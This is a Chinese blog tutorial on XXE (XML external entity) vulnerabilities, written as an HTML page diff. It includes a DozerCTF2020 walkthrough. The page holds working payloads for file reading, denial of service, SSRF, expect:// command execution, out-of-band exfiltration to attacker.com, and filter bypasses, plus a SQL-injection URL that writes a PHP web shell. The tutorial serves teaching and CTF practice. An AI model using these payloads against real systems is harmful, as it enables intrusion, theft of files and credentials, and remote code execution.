@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>从0到1了解XXE || noob weber</title>
+<link rel="icon" href="http://blog.yunli1.com/images/touxiang.ico" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="从0到1了解XXE">
+<meta property="og:type" content="website">
+<meta property="og:url" content="http://blog.yunli1.com/2026/01/21/%E4%BB%8E0%E5%88%B01%E4%BA%86%E8%A7%A3XXE/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="noob weber">
+<meta property="og:author" content="yunli">
+
+  
+  
+  
+  <meta name="description" content="一.什么是XXE漏洞xxe漏洞是基于利用xml进行数据传输时，xml规范包含各种潜在危险功能。且xml可利用dtd定义外部实体，这可作为一个有效利用的点（但dtd逐渐被xmlschema替代，后面要对其学习并转变利用）顺便提一下JSON和XML都是用来传输数据的，为什么XXE是出现在XML中的，而没有出现在J">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello,world"); </script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+<main>
+    <!-- <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div> -->
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/atom.xml" rel="noopener">
+                        
+                            <img src="/images/menu_ico/rss.svg" class="menu-icon" alt="RSS订阅">
+                        
+                        RSS订阅
+                    </a>
+                </li>
+            
+            
+                <li>
+                    <button class="search-toggle-btn" aria-label="打开搜索">
+                        <img src="/images/menu_ico/search.svg" class="menu-icon" alt="search">
+                        搜索
+                    </button>
+                </li>
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+    
+<script src="/js/search.js"></script>
+
+
+    
+        <!-- 搜索模态框 -->
+        <div id="search-modal" class="search-modal">
+          <div class="search-modal-content">
+            <div class="search-header">
+              <form class="search-form" action="#" onsubmit="return false;">
+                <input type="text" id="search-input" placeholder="输入关键词搜索" autocomplete="off">
+                <button type="button" class="search-close-btn" aria-label="关闭">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </button>
+              </form>
+            </div>
+            <div id="search-results"></div>
+          </div>
+        </div>
+
+        <script>
+        // 向全局对象添加i18n数据，以便search.js使用
+        window.WANG_THEME = window.WANG_THEME || {};
+        window.WANG_THEME.i18n = {
+          search: {
+            noResults: '没有找到相关结果',
+            loading: '正在加载...',
+            placeholder: '输入关键词搜索',
+            close: '关闭',
+            shortcut_tip: '按 ESC 关闭',
+            toggle_search: '打开搜索',
+            error_loading: '加载搜索数据失败'
+          }
+        };
+        </script>
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">noob weber</h2>
+        <img class="avatar avatar-round" src="/images/touxiang.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">yunli</h2>
+        <h3 class="site-subtitle">noober weber</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/yunli060903" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="mailto:3192028562@qq.com" aria-label="Email的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/envelope.svg" class="icon" alt="Email的图标"><p>Email</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">从0到1了解XXE</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-01-20T16:00:00.000Z">2026-01-21</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/web/">web</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-05-14T03:05:20.914Z">2026-05-14</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h2>一.什么是XXE漏洞</h2>
+
+<p>xxe漏洞是基于利用xml进行数据传输时，xml规范包含各种潜在危险功能。且xml可利用dtd定义外部实体，这可作为一个有效利用的点（但dtd逐渐被xml schema替代，后面要对其学习并转变利用）</p>
+<p>顺便提一下JSON和XML都是用来传输数据的，为什么XXE是出现在XML中的，而没有出现在JSON中。其根本的原因就是<strong>XML和JSON两者对比最根本的区别是XML 是“可执行结构”，JSON 只是“数据结构”</strong></p>
+<h2>二.XML介绍</h2>
+
+<h3>2.1. XML基础</h3>
+
+<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
+<h3>2.2. 基本语法</h3>
+
+<p>XML 文档在开头有 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p>
+<p>除了可选的开头外，XML 语法主要有以下的特性：</p>
+<ul>
+<li>所有 XML 元素都须有关闭标签</li>
+<li>XML 标签对大小写敏感</li>
+<li>XML 必须正确地嵌套</li>
+<li>XML 文档必须有根元素</li>
+<li>XML 的属性值需要加引号</li>
+</ul>
+<p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p>
+<h3>2.3.dtd</h3>
+
+<p>DTD（Document Type Definition，文档类型定义）是用于定义 XML 文档结构、元素、属性及实体的规范，属于 XML 1.0 规格的一部分。它通过定义一套标记规则，验证 XML 文档是否合法（有效），确保不同应用程序间交换数据的统一性和数据结构化。</p>
+<p><strong>DTD 的核心内容与功能：</strong></p>
+<ul>
+<li><p><strong>结构约束</strong>：明确定义 XML 中可以使用哪些元素、元素间的关系（顺序、嵌套）以及属性定义。</p>
+</li>
+<li><p><strong>合法性校验</strong>：XML 解析器通过 DTD 检查 XML 文档内容是否合乎规范，即验证其是否为“有效（Valid）”XML。</p>
+</li>
+<li><p><strong>定义规则</strong>：DTD 包含了元素、属性、实体或符号的定义规则。</p>
+</li>
+</ul>
+<p><strong>DTD 的分类：</strong></p>
+<ul>
+<li><strong>内部 DTD</strong>：直接定义在 XML 文档内部的 <code>&lt;!DOCTYPE&gt;</code> 声明中。</li>
+<li><strong>外部 DTD</strong>：定义在独立的 <code>.dtd</code> 文件中，通过 <code>&lt;!DOCTYPE&gt;</code> 引入，支持多个 XML 文档共享。</li>
+</ul>
+<h3>2.4.实体</h3>
+
+<p><strong>XML实体（XML Entity）</strong> 是XML文档中定义的<strong>命名数据片段</strong>，可以在文档中通过引用名称来重用。</p>
+<p>实体可以分为外部实体和内部实体，但除了上面的分法，还可以分为通用实体和参数实体，我知道你很懵，但你先别懵，坚持住。</p>
+<h4>内部实体：</h4>
+
+<p>内部实体就是在dtd里面直接定义的实体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ctf [</span><br><span class="line">    &lt;!ENTITY person &quot;ctfer&quot;&gt;</span><br><span class="line">    &lt;!ENTITY hello &quot; hello &amp;title;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY word &quot;我要学ctf&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ctf&gt;</span><br><span class="line">    &lt;publisher&gt;&amp;person;&lt;/publisher&gt;</span><br><span class="line">    &lt;rights&gt;&amp;hello;&lt;/rights&gt;</span><br><span class="line">    &lt;edition&gt;我们的口号是：&amp;word;&lt;/edition&gt;</span><br><span class="line">&lt;/ctf&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的栗子呈现出来的结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctfer</span><br><span class="line">hello ctfer</span><br><span class="line">我们的口号是：我要学ctf</span><br></pre></td></tr></table></figure>
+
+
+
+<h4>外部实体</h4>
+
+<p>一般在XXE漏洞中利用的都是外部实体，因为外部实体其实就是引用外部文件内容作为数据。同时，也可以利用伪协议读取解析该xml的本地文件内容。（xml可以直接引用伪协议是因为当XML解析处理此类实体时，会尝试打开该URL以获得实体的值。如果XML解析器是用PHP实现的（例如PHP的DOMDocument或SimpleXML扩展），那么它会调用PHP的流处理函数，从而触发 <code>php://</code> 流包装器的逻辑。当然，通用的ftp,data等伪协议一般xml的解析器都是可用的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE notice [</span><br><span class="line">    &lt;!ENTITY footer SYSTEM &quot;footer.xml&quot;&gt;</span><br><span class="line">    &lt;!ENTITY logo SYSTEM &quot;logo.svg&quot; NDATA svg&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">    &lt;header&gt;公司公告&lt;/header&gt;</span><br><span class="line">    &lt;content&gt;这里是公告内容...&lt;/content&gt;</span><br><span class="line">    &amp;footer;  &lt;!-- 插入footer.xml文件内容 --&gt;</span><br><span class="line">&lt;/document&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4>通用实体:</h4>
+
+<p>通用实体说白了就是可以直接在XML直接应用的实体，也就是我们可以在DTD外部直接利用<code>&amp;</code>引用的实体，其实上面外部实体和内部实体的例子都是通用实体，那这里就不再用代码讲述了，下面再讲讲参数实体我相信各位师傅就会区分了。</p>
+<h4>参数实体：</h4>
+
+<p>参数实体是仅可以用于dtd内部的实体，它的作用域只在dtd中，如果你在<code>&lt;!DOCTYPE &gt;</code>中使用将不会有任何反应，来个栗子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [</span><br><span class="line">    &lt;!-- 1. 普通外部实体 --&gt;</span><br><span class="line">    &lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 2. 参数实体（带base64编码） --&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 3. 外部 DTD 引用 --&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/abc.dtd&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 4. 执行外部 DTD --&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑如下图：<br><img src="/2026/01/21/%E4%BB%8E0%E5%88%B01%E4%BA%86%E8%A7%A3XXE/1.png"></p>
+<h2>三.XXE攻击</h2>
+
+<p>所谓XXE攻击就是利用xml语法自定义语句查询自己想要的信息。我们用一个最简单的栗子来讲解一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE notice [</span><br><span class="line">    &lt;!ENTITY footer SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">    &amp;footer;  </span><br><span class="line">&lt;/document&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以直接读取<code>/etc/passwd</code>中的内容</p>
+<p>下面来介绍一些XXE攻击方式</p>
+<h3 id="3-1-拒绝服务攻击"><a href="#3-1-拒绝服务攻击" class="headerlink" title="3.1. 拒绝服务攻击"></a>3.1. 拒绝服务攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
+<h3 id="3-2-文件读取"><a href="#3-2-文件读取" class="headerlink" title="3.2. 文件读取"></a>3.2. 文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;file;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-3-SSRF"><a href="#3-3-SSRF" class="headerlink" title="3.3. SSRF"></a>3.3. SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [</span><br><span class="line">&lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-4-RCE"><a href="#3-4-RCE" class="headerlink" title="3.4. RCE"></a>3.4. RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- expect伪协议 --&gt;</span><br><span class="line">expect:// 是 PHP 的一个 流包装器，由 expect 扩展提供。当 PHP 的文件操作函数（如 fopen(), file_get_contents()）处理一个以 expect:// 开头的 URI 时，它会执行 URI 中指定的命令，并返回命令的输出。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="3-5-XInclude"><a href="#3-5-XInclude" class="headerlink" title="3.5. XInclude"></a>3.5. XInclude</h3><p>XInclude攻击</p>
+<p>有些应用程序接收客户端提交的数据，将其嵌入到服务器端的 XML 文档中，然后解析该文档。例如，当客户端提交的数据被放入后端 SOAP 请求中，并由后端 SOAP 服务进行处理时，就会发生这种情况。</p>
+<p>在这种情况下，无法执行经典的 XXE 攻击，因为无法控制整个 XML 文档，因此无法定义或修改<code>DOCTYPE</code>元素。但是，或许可以使用子文档<code>XInclude</code>来代替。<code>XInclude</code>子文档是 XML 规范的一部分，它允许从子文档构建 XML 文档。可以将攻击<code>XInclude</code>植入 XML 文档中的任何数据值中，因此即使只能控制服务器端 XML 文档中的单个数据项，也可以执行攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3>3.6.修改内容</h3>
+
+<p>XXE 通过修改内容类型发起攻击</p>
+<p>大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如<code>application/x-www-form-urlencoded</code>。有些网站期望接收这种格式的请求，但也能容忍其他内容类型，包括 XML。</p>
+<p>例如，如果一个普通的请求包含以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar</span><br></pre></td></tr></table></figure>
+
+<p>那么，您可以尝试提交以下请求，结果应该是一样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0 Content-Type: text/xml Content-Length: 52 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果应用程序容忍消息体中包含 XML 的请求，并将消息体内容解析为 XML，那么只需将请求重新格式化为 XML 格式，即可利用隐藏的 XXE 攻击面。</p>
+<h3>3.7.文件上传</h3>
+
+<p>某些应用程序允许用户上传文件，这些文件随后会在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式示例包括 DOCX 等办公文档格式和 SVG 等图像格式。</p>
+<p>例如，某个应用程序可能允许用户上传图片，并在上传后在服务器上进行处理或验证。即使应用程序预期接收PNG或JPEG等格式的图片，其使用的图像处理库也可能支持SVG格式。由于SVG格式使用XML，攻击者可以提交恶意SVG图片，从而利用XXE漏洞的隐蔽攻击面。</p>
+<p>我们借用DozerCTF2020的一道题目来讲解一下利用SVG文件上传实现XXE攻击：打开网页输入框可以输入URL的地址，然后进行检查URL指向的file是否为svg图片，SVG是基于XML的矢量图，可以支持Entity（实体）功能，这里未严格限制格式，因此造成blind xxe，ssrf打内网服务。先写一个简单的SVG图片源码放在vps上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fortiguard [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY lab &quot;AAAA&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line"></span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交SVG图片源码地址发现实体成功显示，然后尝试读取历史操作的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fortiguard [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line"></span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>页面正常返回信息，但是经过尝试发现，并不能直接读到文件的内容，因为是无回显，所以进行尝试XXE的盲打，也通过加载外部的dtd文件，进而把读取结果以HTTP请求的方式发送到服务器上面进行读取，构造test.svg。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fortiguard [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/abc.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%dtd;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line"></span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>继续构造abc.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line"></span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1/?%file;&#x27;&gt;&quot;</span><br><span class="line"></span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>这里将test.svg以及abc.dtd放进去vps上面，在网页提交test.svg的链接即可成功读取到.bash_history，可通过读取历史记录获取信息读取网页源码，然后利用SSRF打内网。首先利用sql注入写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23</span><br></pre></td></tr></table></figure>
+
+<p>然后进行读取flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3>3.8.绕过方式</h3>
+
+<p>1.过滤xml的证明<br>即过滤<code>&lt;?xml version=&quot;1.0&quot;</code><br>根据 XML 1.0 和 1.1 规范，XML 声明是可选的。如果文档没有声明，解析器会采用默认值</p>
+<p>(1)将双引号改换为单引号<br>(2)在<code>xml</code>和<code>version</code>之间多加一个空格</p>
+<p>2.无回显<br>利用带外技术解决<br>这个过程两个关键是读取本地文件，利用http请求携带参数数据发送给自己<br>但我们并不能将这两个过程写在一个内部dtd中，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % send SYSTEM &quot;http://attacker.com/?%file;&quot;&gt;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当解析器处理 <code>&lt;!ENTITY % send SYSTEM &quot;http://attacker.com/?%file;&quot;&gt;</code> 时，<code>%file</code> 是一个参数实体引用，但<strong>在实体定义中，参数实体引用不会立即展开</strong>。它只是作为字符串的一部分被保存下来。</li>
+<li>当执行 <code>%send;</code> 时，解析器会将 <code>%send</code> 的替换文本（即 <code>&quot;http://attacker.com/?%file;&quot;</code>）插入到 DTD 中，但此时 <code>%file</code> 仍然是一个参数实体引用，需要再次展开。然而，<code>%file</code> 的值此时可能已经被定义，但展开时机可能不对，或者由于解析器对参数实体展开的顺序限制，导致最终 <code>%send</code> 请求的 URL 中仍然是 <code>%file</code> 的字面字符串，而不是其内容。</li>
+</ul>
+<p>因此，会直接失败</p>
